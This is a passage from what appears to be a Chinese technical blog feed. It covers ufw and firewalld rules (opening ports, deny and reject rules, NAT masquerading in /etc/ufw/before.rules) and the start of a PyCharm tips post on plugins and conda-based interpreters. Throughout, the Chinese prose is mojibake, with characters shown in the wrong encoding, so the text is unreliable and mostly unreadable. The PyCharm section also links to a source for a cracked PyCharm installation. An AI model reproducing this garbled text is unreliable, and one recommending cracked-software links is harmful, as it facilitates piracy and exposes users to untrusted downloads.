çš„ufwä½œä¸ºé˜²ç«å¢™ã€‚</p><p>å…³é—­é˜²ç«å¢™å¯ä»¥ä½¿ç”¨systemctl stop firewalld å’Œ systemctl disable firewalld ã€‚</p><pre><code>firewall-cmd --permanent --add-port=51080/tcp[root@vultr ~]# firewall-cmd --list-ports50022/tcp 51080/tcp 38388/tcp 38388/udp 23307/tcp</code></pre><h1 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h1><p>UFWï¼ˆUncomplicated Firewalï¼‰æ˜¯ Ubuntu ä¸‹åŸºäº iptables çš„æ¥å£ï¼Œæ—¨åœ¨ç®€åŒ–é…ç½®é˜²ç«å¢™çš„è¿‡ç¨‹ã€‚é»˜è®¤æƒ…å†µä¸‹ UFW ä¸ºå…³é—­çŠ¶æ€ï¼Œå¼€å¯æ—¶é»˜è®¤ä¸ºæ‹’ç»æ‰€æœ‰ä¼ å…¥é“¾æ¥ï¼Œå¹¶å…è®¸æ‰€æœ‰ä¼ å‡ºè¿æ¥ã€‚åªæœ‰rootæƒé™æ‰èƒ½æ“ä½œ</p><pre><code>ufw status verbose</code></pre><p>æ‰“å°æ‹’ç»è¿æ¥çš„åœ°å€ï¼Œå’Œå¼€æ”¾çš„ç«¯å£ã€å…³é—­çš„ç«¯å£</p><p>UFWé˜²ç«å¢™çš„é»˜è®¤è¡Œä¸ºæ˜¯<strong>é˜»æ­¢æ‰€æœ‰ä¼ å…¥å’Œè½¬å‘æµé‡</strong>ï¼Œå¹¶<strong>å…è®¸æ‰€æœ‰å‡ºç«™æµé‡</strong>ã€‚è¿™æ„å‘³ç€é™¤éæ‚¨æ‰“å¼€æŒ‡å®šçš„ç«¯å£ï¼Œå¦åˆ™ä»»ä½•å°è¯•è®¿é—®æ‚¨çš„æœåŠ¡å™¨çš„äººéƒ½å°†æ— æ³•è¿æ¥ã€‚</p><pre><code>sudo ufw allow sshsudo ufw enable</code></pre><p>å°†ä¼šå¯ç”¨ubuntué˜²ç«å¢™ï¼Œå¹¶æç¤ºä½ å‘½ä»¤å¯èƒ½ä¼šä¸­æ–­SSHçš„è¿æ¥æ˜¯å¦è¦è¿›è¡Œè¯¥æ“ä½œ</p><p>æ‰“å¼€ç«¯å£ï¼Œå¦‚æœæœªç»™å‡ºåè®®ï¼Œåˆ™UFWä¼šåŒæ—¶ä¸ºtcpå’Œudpåˆ›å»ºè§„åˆ™ï¼š</p><pre><code>ufw allow port_number/protocol</code></pre><p>å¦‚æœå†™åè®®åå­—çš„è¯ï¼Œufwä¼šæ£€æŸ¥<strong>/etc/services</strong>ä¸­å¯¹åº”æŒ‡å®šçš„æœåŠ¡å’Œç«¯å£</p><p>UFWè¿˜å…è®¸æ‚¨æ‰“å¼€æŒ‡å®šçš„ç«¯å£èŒƒå›´ã€‚èµ·å§‹ç«¯å£å’Œç»“æŸç«¯å£ç”¨å†’å·:åˆ†éš”ï¼Œå¹¶ä¸”æ‚¨å¿…é¡»æŒ‡å®šåè®®tcpæˆ–udpã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè¦åŒæ—¶åœ¨tcpå’Œudpå…è®¸æ¥è‡ª7100åˆ°7200ç«¯å£çš„è¿æ¥ï¼Œåˆ™å¯ä»¥è¿è¡Œå‘½ä»¤</p><pre><code>sudo ufw allow 7100:7200/tcpã€‚</code></pre><p>æŒ‡å®šç«¯å£å·æœ€å¸¸ç”¨çš„æ–¹å¼ä¾‹å¦‚å‘½ä»¤sudo ufw allow 80å°†ä¼šæ‰“å¼€80ç«¯å£ã€‚UFWè¿˜æ”¯æŒä½¿ç”¨protoå…³é”®å­—æŒ‡å®šåè®®ã€‚</p><pre><code>sudo ufw allow 80 #tcpå’Œudpsudo ufw allow 80/tcp #ä»…tcpsudo ufw allow proto tcp to any port 80</code></pre><h3 id="å…è®¸æºIPåœ°å€æ¥å£-ç½‘å¡"><a href="#å…è®¸æºIPåœ°å€æ¥å£-ç½‘å¡" class="headerlink" title="å…è®¸æºIPåœ°å€æ¥å£/ç½‘å¡"></a>å…è®¸æºIPåœ°å€æ¥å£/ç½‘å¡</h3><p>å¦‚æœåªå†™åè®®ï¼ˆå¦‚ http sshï¼‰ï¼Œä¼šæ£€æŸ¥/etc/serviceså¯¹åº”ç«¯å£æ¥å°ç«¯å£</p><p>è¦å…è®¸æ¥è‡ªæŒ‡å®šæºIPçš„è¿æ¥ï¼Œè¯·ä½¿ç”¨fromå…³é”®å­—ï¼Œåè·Ÿæºåœ°å€ã€‚å¦‚æœè¦ä»…å…è®¸æŒ‡å®šçš„IPåœ°å€è®¿é—®æŒ‡å®šçš„ç«¯å£ï¼Œè¯·ä½¿ç”¨to any portå…³é”®å­—ï¼Œåè·Ÿç«¯å£å·</p><pre><code>sudo ufw allow from 192.168.1.100 #ä»…å…è®¸å•IPåœ°å€sudo ufw allow from 192.168.1.100 to any port 3306 #ä»…å…è®¸å•IPåœ°å€è¿æ¥3306sudo ufw allow from 192.168.1.0/24 to any port 3306sudo ufw allow in on eth2 to any port 3306ufw allow sshufw allow 7722/tcp</code></pre><h3 id="æ‹’ç»è¿æ¥"><a href="#æ‹’ç»è¿æ¥" class="headerlink" title="æ‹’ç»è¿æ¥"></a>æ‹’ç»è¿æ¥</h3><p>æ‰€æœ‰ä¼ å…¥è¿æ¥çš„é»˜è®¤ç­–ç•¥å‡è®¾ç½®ä¸ºdenyï¼Œå¦‚æœæ‚¨æœªæ›´æ”¹é»˜è®¤ç­–ç•¥ï¼Œé™¤éæ‰“å¼€æŒ‡å®šç«¯å£çš„è¿æ¥ï¼Œå¦åˆ™UFWä¼šé˜»æ­¢æ‰€æœ‰ä¼ å…¥è¿æ¥ã€‚</p><p>æ’°å†™æ‹’ç»è§„åˆ™ä¸æ’°å†™å…è®¸è§„åˆ™ç›¸åŒã€‚ä½¿ç”¨denyå…³é”®å­—è€Œä¸æ˜¯allowã€‚å‡è®¾æ‰“å¼€äº†ç«¯å£80å’Œ443ï¼Œå¹¶ä¸”æœåŠ¡å™¨å—åˆ°23.24.25.0/24ç½‘ç»œçš„æ”»å‡»ã€‚è¦æ‹’ç»æ¥è‡ª23.24.25.0/24çš„æ‰€æœ‰è¿æ¥ã€‚</p><pre><code>sudo ufw deny from 23.24.25.0/24</code></pre><p>å‘½ä»¤å°†ä¼šæ‹’ç»23.24.25.0/24ç½‘æ®µçš„è¿æ¥ï¼Œå¦‚æœä½ ä»…éœ€è¦æ‹’ç»æŒ‡å®šIPåœ°å€çš„è¿æ¥ï¼Œåˆ™ä¸éœ€è¦æ·»åŠ å­ç½‘æ©ç ã€‚</p><p>ä½ è¿˜å¯ä»¥æ‹’ç»æŒ‡å®šçš„IPåœ°å€è¿æ¥åˆ°æŒ‡å®šçš„ç«¯å£ï¼Œä¾‹å¦‚å‘½ä»¤sudo ufw deny proto tcp from 23.24.25.0/24 to any port 80,443ã€‚å°†ä¼šæ‹’ç»23.24.25.0/24è®¿é—®ç«¯å£80å’Œ443çš„ç¤ºä¾‹</p><pre><code>denyï¼š    å½“ä½¿ç”¨ deny åŠ¨ä½œæ—¶ï¼Œé˜²ç«å¢™ä¼šé»˜é»˜åœ°ä¸¢å¼ƒè¢«æ‹’ç»çš„æ•°æ®åŒ…ï¼Œè€Œä¸å‘æºå‘é€ä»»ä½•å“åº”ã€‚    å¯¹äº TCP è¿æ¥ï¼Œæºä¸»æœºå°†ç»§ç»­å°è¯•å‘é€æ•°æ®åŒ…ï¼Œç›´åˆ°è¾¾åˆ°è¶…æ—¶æˆ–æ”¾å¼ƒä¸ºæ­¢ã€‚    è¿™ç§åŠ¨ä½œä¼šä½¿å¾—æ”»å‡»è€…éš¾ä»¥ç¡®å®šç›®æ ‡ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œå› ä¸ºä»–ä»¬ä¸ä¼šæ”¶åˆ°æ‹’ç»è¿æ¥çš„å“åº”ã€‚    ä½†è¿™ä¹Ÿå¯èƒ½å¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚å¯èƒ½ä¼šä½¿å¾—æ”»å‡»è€…æ›´éš¾ä»¥ç¡®å®šæ˜¯ç”±äºç½‘ç»œæ•…éšœè¿˜æ˜¯è¢«é˜²ç«å¢™æ‹’ç»ã€‚rejectï¼š    å½“ä½¿ç”¨ reject åŠ¨ä½œæ—¶ï¼Œé˜²ç«å¢™ä¼šå‘é€ä¸€æ¡ ICMP é”™è¯¯æ¶ˆæ¯ï¼ˆå¦‚â€œç›®æ ‡ä¸å¯è¾¾â€ï¼‰ç»™æºä¸»æœºï¼Œé€šçŸ¥å…¶è¿æ¥è¢«æ‹’ç»ã€‚    å¯¹äº TCP è¿æ¥ï¼Œè¿™å°†å¯¼è‡´æºä¸»æœºç«‹å³æ”¶åˆ°æ‹’ç»è¿æ¥çš„å“åº”ï¼Œä»è€Œä¸å†å°è¯•å»ºç«‹è¿æ¥ã€‚    ä¸ deny ä¸åŒï¼Œä½¿ç”¨ reject åŠ¨ä½œä¼šç«‹å³é€šçŸ¥æºä¸»æœºè¿æ¥è¢«æ‹’ç»ï¼Œè¿™æ ·å¯ä»¥æ›´å¿«åœ°é‡Šæ”¾ç½‘ç»œèµ„æºå¹¶å‡å°‘æ”»å‡»è€…çš„ç½‘ç»œæµé‡ã€‚</code></pre><hr><pre><code>sudo ufw deny from 23.24.25.100 #æ‹’ç»æŒ‡å®šçš„IPè¿æ¥sudo ufw deny from 23.24.25.0/24  #æ•´ä¸ªç½‘æ®µsudo ufw deny proto tcp from 23.24.25.0/24 to any port 80,443æ‹’ç»ä½¿ç”¨rejectufw reject from 202.54.5.7 to any</code></pre><h3 id="æŸ¥çœ‹å¹¶åˆ é™¤é˜²ç«å¢™è§„åˆ™"><a href="#æŸ¥çœ‹å¹¶åˆ é™¤é˜²ç«å¢™è§„åˆ™" class="headerlink" title="æŸ¥çœ‹å¹¶åˆ é™¤é˜²ç«å¢™è§„åˆ™"></a>æŸ¥çœ‹å¹¶åˆ é™¤é˜²ç«å¢™è§„åˆ™</h3><pre><code>sudo ufw status numbered</code></pre><p>å‡è®¾è¦åˆ é™¤çš„ufwè§„åˆ™ç¼–å·æ˜¯3ï¼Œè¯¥è§„åˆ™å·å…è®¸è¿æ¥åˆ°ç«¯å£8080ã€‚ä½ å¯è¿è¡Œå‘½ä»¤</p><pre><code>sudo ufw delete 3</code></pre><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯é€šè¿‡æŒ‡å®šå®é™…è§„åˆ™æ¥åˆ é™¤è§„åˆ™ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ‰“å¼€äº†8069ç«¯å£çš„è§„åˆ™ï¼Œåˆ™å¯ä»¥è¿è¡Œå‘½ä»¤sudo ufw delete allow 8069å°†å…¶åˆ é™¤ã€‚</p><pre><code>sudo ufw status numbered #æŸ¥çœ‹é˜²ç«å¢™çš„çŠ¶æ€sudo ufw delete 3 #æ ¹æ®ç¼–å·åˆ é™¤sudo ufw delete allow 8069 é€šè¿‡è§„åˆ™åˆ é™¤è§„åˆ™</code></pre><h3 id="ç¦ç”¨-å¯ç”¨"><a href="#ç¦ç”¨-å¯ç”¨" class="headerlink" title="ç¦ç”¨/å¯ç”¨"></a>ç¦ç”¨/å¯ç”¨</h3><p>å¦‚æœå‡ºäºæŸäº›åŸå› è¦åœæ­¢UFWå¹¶åœç”¨æ‰€æœ‰è§„åˆ™ï¼Œåˆ™å¯ä»¥è¿è¡Œå‘½ä»¤sudo ufw disableç¦ç”¨é˜²ç«å¢™ã€‚</p><p>ä»¥åï¼Œå¦‚æœæ‚¨æƒ³é‡æ–°å¯ç”¨ufwå¹¶æ¿€æ´»æ‰€æœ‰è§„åˆ™ï¼Œè¿è¡Œå‘½ä»¤sudo ufw enableå³å¯ã€‚</p><p>é‡ç½®UFWå°†ç¦ç”¨UFWï¼Œå¹¶åˆ é™¤æ‰€æœ‰æ´»åŠ¨è§„åˆ™ã€‚ å¦‚æœæ‚¨ä¸æƒ³è¿˜åŸæ‰€æœ‰æ›´æ”¹å¹¶é‡æ–°å¼€å§‹ï¼Œè¿™å°†å¾ˆæœ‰å¸®åŠ©ã€‚è¦é‡ç½®UFWï¼Œå¯ä»¥è¿è¡Œå‘½ä»¤sudo ufw resetã€‚</p><pre><code>sudo ufw disable #ç¦ç”¨sudo ufw enable #å¼€å¯sudo ufw reset #é‡ç½®</code></pre><h3 id="IPä¼ªè£…-è½¬å‘"><a href="#IPä¼ªè£…-è½¬å‘" class="headerlink" title="IPä¼ªè£…/è½¬å‘"></a>IPä¼ªè£…/è½¬å‘</h3><p>IPä¼ªè£…æ˜¯Linuxå†…æ ¸ä¸­NATç½‘ç»œåœ°å€è½¬æ¢çš„ä¸€ç§å˜ä½“ï¼Œå®ƒé€šè¿‡é‡å†™æºIPåœ°å€å’Œç›®æ ‡IPåœ°å€ç«¯å£æ¥è½¬æ¢ç½‘ç»œæµé‡ã€‚å€ŸåŠ©IPä¼ªè£…ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸€å°Linuxè®¡ç®—æœºå……å½“ç½‘å…³ï¼Œå…è®¸ç§æœ‰ç½‘ç»œä¸­çš„ä¸€å°æˆ–å¤šå°è®¡ç®—æœºä¸äº’è”ç½‘é€šä¿¡ã€‚ä¾‹å¦‚VMwareæˆ–è€…Virtualboxæ­¤ç±»è™šæ‹Ÿè½¯ä»¶å°±æ˜¯é€šè¿‡ä¸€ä¸ªNATé€‚é…å™¨å……å½“ç½‘å¡ï¼Œè½¬å‘å¤šå°è™šæ‹Ÿæœºç½‘ç»œæ•°æ®ï¼Œè¿æ¥åˆ°äº’è”ç½‘ã€‚</p><p>ä½¿ç”¨UFWé…ç½®IPä¼ªè£…æ¶‰åŠå‡ ä¸ªæ­¥éª¤ã€‚é¦–å…ˆï¼Œæ‚¨éœ€è¦å¯ç”¨IPè½¬å‘ip_forwardã€‚</p><p>è¯·ä½¿ç”¨ä½ å–œæ¬¢çš„ç¼–è¾‘å™¨ç¼–è¾‘/etc/ufw/sysctl.confæ–‡ä»¶ï¼Œåœ¨æœ¬æ•™ç¨‹ä¸­å°†ä½¿ç”¨vimç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ï¼š</p><pre><code>sudo vim /etc/ufw/sysctl.conf</code></pre><p>æŸ¥æ‰¾å¹¶å–æ¶ˆæ³¨é‡Šä»¥ä¸‹è¡Œï¼š</p><pre><code>net/ipv4/ip_forward=1</code></pre><p>æ‚¨è¿˜éœ€è¦é…ç½®UFWä»¥å…è®¸è½¬å‘æ•°æ®åŒ…ã€‚æ‰“å¼€UFWé…ç½®æ–‡ä»¶/etc/default/ufwã€‚æ‰¾åˆ°DEFAULT_FORWARD_POLICYé”®ï¼Œç„¶åå°†å€¼ä»DROPæ›´æ”¹ä¸ºACCEPTã€‚</p><pre><code>sudo vim /etc/default/ufw</code></pre><h1 id="æ‰¾åˆ°DEFAULT-FORWARD-POLICYæ”¹ä¸ºACCEPT"><a href="#æ‰¾åˆ°DEFAULT-FORWARD-POLICYæ”¹ä¸ºACCEPT" class="headerlink" title="æ‰¾åˆ°DEFAULT_FORWARD_POLICYæ”¹ä¸ºACCEPT"></a>æ‰¾åˆ°DEFAULT_FORWARD_POLICYæ”¹ä¸ºACCEPT</h1><pre><code>DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</code></pre><p>ç°åœ¨ï¼Œæ‚¨éœ€è¦åœ¨natè¡¨ä¸­è®¾ç½®POSTROUTINGé“¾çš„é»˜è®¤ç­–ç•¥å’Œä¼ªè£…è§„åˆ™ã€‚ è¯·æ‰“å¼€/etc/ufw/before.rulesæ–‡ä»¶ã€‚</p><pre><code>sudo vim /etc/ufw/before.rules</code></pre><p>è¿½åŠ ä»¥ä¸‹å‡ è¡Œåˆ°æ–‡ä»¶/etc/ufw/before.rules</p><pre><code>#NAT table rules å¯ç”¨nat è¡¨*nat# å…è®¸POSTROUTING é“¾:POSTROUTING ACCEPT [0:0]# è½¬å‘eth0æ¥å£çš„æ•°æ®åŒ…ï¼Œè¯·å°†eth0æ›´æ”¹ä¸ºä½ å¯¹åº”çš„æ¥å£-A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE# don&#39;t delete the &#39;COMMIT&#39; line or these rules won&#39;t be processedCOMMIT</code></pre><p>æ³¨æ„ä¸è¦åˆ é™¤COMMITå…³é”®è¯ï¼Œå®ƒæ°¸è¿œæ˜¯åœ¨æœ€åä¸€è¡Œã€‚åˆ«å¿˜äº†åœ¨-A POSTROUTINGè¡Œä¸­æ›¿æ¢eth0ä»¥åŒ¹é…ä½ çš„è®¡ç®—æœºå¯ä»¥è¿æ¥åˆ°äº’è”ç½‘çš„åç§°ã€‚</p><p>å®Œæˆåï¼Œä¿å­˜å¹¶å…³é—­æ–‡ä»¶ã€‚æœ€åï¼Œé€šè¿‡å‘½ä»¤sudo ufw disableç¦ç”¨å’Œå‘½ä»¤sudo ufw enableé‡æ–°å¯ç”¨UFWé‡æ–°åŠ è½½UFWè§„åˆ™ã€‚</p><h3 id="systemctl-enable-ufwå’Œufw-enableåŒºåˆ«"><a href="#systemctl-enable-ufwå’Œufw-enableåŒºåˆ«" class="headerlink" title="systemctl enable ufwå’Œufw enableåŒºåˆ«"></a>systemctl enable ufwå’Œufw enableåŒºåˆ«</h3><p>æˆ‘å¯¹è¿™ä¸¤ä¸ªå‘½ä»¤ç–‘æƒ‘ï¼Œä¸è¿‡æœ‰ç›¸å…³çš„è¯´æ˜ï¼š<br><a href="https://unix.stackexchange.com/questions/555020/how-should-i-enable-ufw-through-systemctl-enable-or-ufw-enable">https://unix.stackexchange.com/questions/555020/how-should-i-enable-ufw-through-systemctl-enable-or-ufw-enable</a></p><p>systemctlåªæ˜¯è¦ä¸è¦è€ƒè™‘ufwä½œä¸ºç³»ç»Ÿå¼•å¯¼æ—¶å¯åŠ¨çš„åå°è¿›ç¨‹ã€‚</p><p>ufwæœ¬èº«é»˜è®¤æ˜¯å…³ç€çš„ï¼Œsystemctl status ufwå¯ä»¥çœ‹åˆ°ufwæ˜¯enabledï¼Œä½†æ˜¯ufw statusçœ‹åˆ°ä»–æ˜¯inactiveï¼Œè¿™æ˜¯ä¸å†²çªçš„ï¼Œè¦å¼€å¯ufwéœ€è¦ ufw enable.</p>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pycharmæŠ€å·§</title>
      <link href="/2024/04/08/Python/pycharm/"/>
      <url>/2024/04/08/Python/pycharm/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#ç ´è§£ç‰ˆå®‰è£…">ç ´è§£ç‰ˆå®‰è£…</a></li><li><a href="#æ’ä»¶æ¨è">æ’ä»¶æ¨è</a></li><li><a href="#pyè§£é‡Šå™¨å’Œè™šæ‹Ÿç¯å¢ƒ">pyè§£é‡Šå™¨å’Œè™šæ‹Ÿç¯å¢ƒ</a><ul><li><a href="#è™šæ‹Ÿè§£é‡Šå™¨å’Œæœºå™¨ç³»ç»Ÿçš„è§£é‡Šå™¨ä¸åŒåŒ…ç¯å¢ƒä¸åŒ">è™šæ‹Ÿè§£é‡Šå™¨å’Œæœºå™¨ç³»ç»Ÿçš„è§£é‡Šå™¨ä¸åŒï¼ŒåŒ…ç¯å¢ƒä¸åŒ</a></li><li><a href="#ä½¿ç”¨pycharmæ‰‹åŠ¨å®‰è£…åŒ…ç¯å¢ƒ">ä½¿ç”¨pycharmæ‰‹åŠ¨å®‰è£…åŒ…ç¯å¢ƒ</a></li></ul></li><li><a href="#ç»“åˆcondaåˆ›å»ºæ–°ç‰ˆæœ¬çš„pythonè§£é‡Šå™¨å¹¶é…ç½®åˆ°pycharm">ç»“åˆcondaåˆ›å»ºæ–°ç‰ˆæœ¬çš„pythonè§£é‡Šå™¨å¹¶é…ç½®åˆ°pycharm</a></li><li><a href="#ä»£ç è¡Œæ•°ç»Ÿè®¡">ä»£ç è¡Œæ•°ç»Ÿè®¡</a></li><li><a href="#profile">profile</a></li><li><a href="#å¸¸ç”¨å¿«æ·é”®">å¸¸ç”¨å¿«æ·é”®</a></li><li><a href="#å¢åŠ sftpéƒ¨ç½²">å¢åŠ SFTPéƒ¨ç½²</a></li><li><a href="#å‡½æ•°æ–‡æ¡£">å‡½æ•°æ–‡æ¡£</a><ul><li><a href="#å®é™…ç¤ºä¾‹">å®é™…ç¤ºä¾‹</a></li></ul></li><li><a href="#æ­£ç¡®çš„å¢åŠ è¿œç¨‹pythonè§£é‡Šå™¨">æ­£ç¡®çš„å¢åŠ è¿œç¨‹pythonè§£é‡Šå™¨</a><ul><li><a href="#å‘ç‚¹pycharmcant-get-remote-credentials-for-deployment-server">å‘ç‚¹ï¼šPycharm:Canâ€™t get remote credentials for deployment server</a></li></ul></li><li><a href="#å°†é¡¹ç›®å¯ç”¨ä¸ºdjangoæ”¯æŒ">å°†é¡¹ç›®å¯ç”¨ä¸ºdjangoæ”¯æŒ</a></li></ul><h1 id="ç ´è§£ç‰ˆå®‰è£…"><a href="#ç ´è§£ç‰ˆå®‰è£…" class="headerlink" title="ç ´è§£ç‰ˆå®‰è£…"></a>ç ´è§£ç‰ˆå®‰è£…</h1><p>pycharm: <a href="https://www.exception.site/essay/pycharm-pojie-jihuoma">https://www.exception.site/essay/pycharm-pojie-jihuoma</a></p><h1 id="æ’ä»¶æ¨è"><a href="#æ’ä»¶æ¨è" class="headerlink" title="æ’ä»¶æ¨è"></a>æ’ä»¶æ¨è</h1><pre><code>æ±‰åŒ–statisticrainbow brackets(éƒ¨åˆ†åŠŸèƒ½30å¤©é™åˆ¶ï¼Œç»å¸¸è®©ä½ ä¹°æ³¨å†Œç ï¼Œå·²å¼ƒç”¨)markdownï¼ˆå…¶å®vscodeçš„mdé˜…è§ˆæ¯”pycharmçš„è¦å¾ˆå¿«ï¼Œè¿™ä¸ªè‡ªè¡Œé€‰æ‹©ï¼‰code glance (å¼ºçƒˆæ¨èï¼Œå³ä¾§æ»šåŠ¨æ¡å˜å°åœ°å›¾)translation</code></pre><h1 id="pyè§£é‡Šå™¨å’Œè™šæ‹Ÿç¯å¢ƒ"><a href="#pyè§£é‡Šå™¨å’Œè™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="pyè§£é‡Šå™¨å’Œè™šæ‹Ÿç¯å¢ƒ"></a>pyè§£é‡Šå™¨å’Œè™šæ‹Ÿç¯å¢ƒ</h1><h3 id="è™šæ‹Ÿè§£é‡Šå™¨å’Œæœºå™¨ç³»ç»Ÿçš„è§£é‡Šå™¨ä¸åŒï¼ŒåŒ…ç¯å¢ƒä¸åŒ"><a href="#è™šæ‹Ÿè§£é‡Šå™¨å’Œæœºå™¨ç³»ç»Ÿçš„è§£é‡Šå™¨ä¸åŒï¼ŒåŒ…ç¯å¢ƒä¸åŒ" class="headerlink" title="è™šæ‹Ÿè§£é‡Šå™¨å’Œæœºå™¨ç³»ç»Ÿçš„è§£é‡Šå™¨ä¸åŒï¼ŒåŒ…ç¯å¢ƒä¸åŒ"></a>è™šæ‹Ÿè§£é‡Šå™¨å’Œæœºå™¨ç³»ç»Ÿçš„è§£é‡Šå™¨ä¸åŒï¼ŒåŒ…ç¯å¢ƒä¸åŒ</h3><p>åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼Œä¼šæƒ³åˆ›å»ºvenvçš„è™šæ‹Ÿè§£é‡Šå™¨å’Œåº“åŒ…<br>ä¼šæ ¹æ®ç³»ç»Ÿç°æœ‰çš„pyå¤åˆ¶ä¸€ä¸ª<br>ä½†æ˜¯åº“æ–‡ä»¶æ˜¯ä¸åŒçš„ï¼Œå› ä¸ºç¯å¢ƒä¸åŒï¼Œå¦‚å›¾ï¼š</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-24-45.png" alt="2024-04-10-22-24-45"></p><h3 id="ä½¿ç”¨pycharmæ‰‹åŠ¨å®‰è£…åŒ…ç¯å¢ƒ"><a href="#ä½¿ç”¨pycharmæ‰‹åŠ¨å®‰è£…åŒ…ç¯å¢ƒ" class="headerlink" title="ä½¿ç”¨pycharmæ‰‹åŠ¨å®‰è£…åŒ…ç¯å¢ƒ"></a>ä½¿ç”¨pycharmæ‰‹åŠ¨å®‰è£…åŒ…ç¯å¢ƒ</h3><p><strong>ç›®å‰æˆ‘æŒ‡å®šè™šæ‹Ÿè§£é‡Šå™¨çš„pyç¯å¢ƒè·¯å¾„ ç›´æ¥ install -r requirements.txt å¤±è´¥ï¼Œæ¨æµ‹requirementsçš„ç‰ˆæœ¬ä¸å¤ªå¯¹ï¼Œæ˜¯pycharmä¸æ”¯æŒçš„åŒ…ç‰ˆæœ¬</strong></p><p>ä½†æ˜¯æˆ‘æ˜¯ç”¨pycharmçš„è®¾ç½® -&gt; é¡¹ç›®  -&gt; pyè§£é‡Šå™¨ æ‰‹åŠ¨å®‰è£…åŒ…æ˜¯å¯ä»¥çš„<br>æ­¤å¤„ä¹Ÿå®¹æ˜“æ˜¾ç¤ºç‰ˆæœ¬</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-25-40.png" alt="2024-04-10-22-25-40"></p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-25-56.png" alt="2024-04-10-22-25-56"></p><p>æˆåŠŸè§£å†³è™šæ‹Ÿç¯å¢ƒè¿è¡Œdjangoé¡¹ç›®</p><p>å¯ä»¥æ­£å¸¸å¯åŠ¨</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-26-26.png" alt="2024-04-10-22-26-26"></p><h1 id="ç»“åˆcondaåˆ›å»ºæ–°ç‰ˆæœ¬çš„pythonè§£é‡Šå™¨å¹¶é…ç½®åˆ°pycharm"><a href="#ç»“åˆcondaåˆ›å»ºæ–°ç‰ˆæœ¬çš„pythonè§£é‡Šå™¨å¹¶é…ç½®åˆ°pycharm" class="headerlink" title="ç»“åˆcondaåˆ›å»ºæ–°ç‰ˆæœ¬çš„pythonè§£é‡Šå™¨å¹¶é…ç½®åˆ°pycharm"></a>ç»“åˆcondaåˆ›å»ºæ–°ç‰ˆæœ¬çš„pythonè§£é‡Šå™¨å¹¶é…ç½®åˆ°pycharm</h1><p><strong>æˆ‘æ€è€ƒäº†ä¸‹ï¼Œpycharmæœ¬èº«æ— æ³•ç›´æ¥ä¸‹è½½python3çš„ä¸åŒç‰ˆæœ¬ï¼Œè€Œæ‰‹åŠ¨ä»pythonå®˜ç½‘ä¸‹è½½ä¸åŒçš„python3ç‰ˆæœ¬ï¼Œæ“ä½œè¿˜æ˜¯å¤ªéº»çƒ¦ã€‚æ­¤å¤„ä¾èµ–condaèƒ½è‡ªåŠ¨ä¸‹è½½ä¸åŒpython3ç‰ˆæœ¬ï¼Œä»¥åŠpycharmå¯ä»¥æŒ‡å®šcondaä¸‹è½½çš„pyå¤åˆ¶è§£é‡Šå™¨åˆ°ä¸åŒçš„é¡¹ç›®ï¼Œå¹¶å¤„ç†ä¸åŒçš„åŒ…ä¾èµ–ï¼Œå¯ä»¥ä½¿å¾—è°ƒè¯•ä¸åŒé¡¹ç›®çš„pythonè§£é‡Šå™¨ç‰ˆæœ¬ã€åŒ…ä¾èµ–ç›¸å¯¹åˆ†ç¦»ã€‚å”¯ä¸€ç¼ºç‚¹å°±æ˜¯ï¼Œè½¯ä»¶é‡å¤ç¨‹åºå†—ä½™ç¨‹åº¦è¾ƒé«˜ï¼Œä½†æ˜¯è¿™æ˜¯pipè‡ªèº«è®¾è®¡çš„é—®é¢˜ã€‚</strong></p><p>ä¸æ¸…æ¥šä¸ºä»€ä¹ˆpycharmç›´æ¥åŠ è½½condaçš„è§£é‡Šå™¨ï¼Œä¼šå‡ºç°å„ç§ç½‘ç»œé—®é¢˜</p><p>å› æ­¤æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤ï¼š</p><pre><code>conda.exe create -p E:\anaconda3\envs\yolov5\envs -y python=3.10</code></pre><p>ï¼ˆè‹¥æ­¤å‘½ä»¤å‡ºç°ç½‘ç»œé—®é¢˜ï¼Œå‚è€ƒcondaçš„å®‰è£…ã€è¿è¡Œä¸€èŠ‚çš„æŠ¥é”™å¤„ç†ï¼‰</p><p>ç„¶åpycharmæ·»åŠ è¯¥ç¯å¢ƒä¸‹çš„venvè§£é‡Šå™¨ï¼ˆécondaç¯å¢ƒï¼‰ï¼š</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-27-33.png" alt="2024-04-10-22-27-33"></p><p>ç›¸å½“äºï¼Œcondaçš„ç›®å½•ä¸‹å¼„äº†py3.10ï¼Œç„¶ååˆåœ¨è¿™ä¸ªä»£ç é¡¹ç›®ä¸‹çš„envå¤åˆ¶äº†è§£é‡Šå™¨ï¼Œå’Œå¼„äº†åŒ…ä¾èµ–çš„ä¸œè¥¿</p><p>æœ€åæ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤ï¼ˆç”¨æˆ·åŠ ç›®å½•ä¸‹çš„pipçš„æ¢æºé…ç½®æ–‡ä»¶æœ‰æ•ˆï¼‰ï¼š</p><pre><code>python -m pip install -r C:\Users\ranja\Desktop\ToStudy\yolov5\requirements.txt</code></pre><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-27-59.png" alt="2024-04-10-22-27-59"></p><p>æœ€ç»ˆç­‰å¾…æ­¤å¤„å®Œæˆå³å¯ã€‚</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-28-25.png" alt="2024-04-10-22-28-25"></p><p>å¦‚æœpycharmæ£€æŸ¥åˆ°å®‰è£…åŒ…çš„ç‰ˆæœ¬éœ€è¦æ›´æ–°ï¼Œåˆ™æ›´æ–°ã€‚</p><p><img 